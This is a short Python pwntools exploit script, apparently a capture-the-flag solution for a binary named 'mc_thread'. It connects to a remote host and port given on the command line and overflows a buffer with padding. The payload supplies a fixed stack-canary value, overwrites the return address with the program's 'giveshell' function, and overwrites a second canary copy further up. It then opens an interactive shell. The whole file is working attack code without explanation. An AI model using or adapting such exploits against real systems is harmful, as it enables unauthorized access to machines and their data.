#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/mc_thread")


giveshell = e.symbols["giveshell"]

payload = b"A" * 0x108
payload += b"MSCANARY"
payload += b"B" * 0x08
payload += pwn.p64(giveshell)

payload += b"C" * (0x948 - len(payload))
payload += b"MSCANARY"

r.sendlineafter(b"Size: ", bytes(str(len(payload)), "ascii"))
r.sendlineafter(b"Data: " , payload)

r.interactive()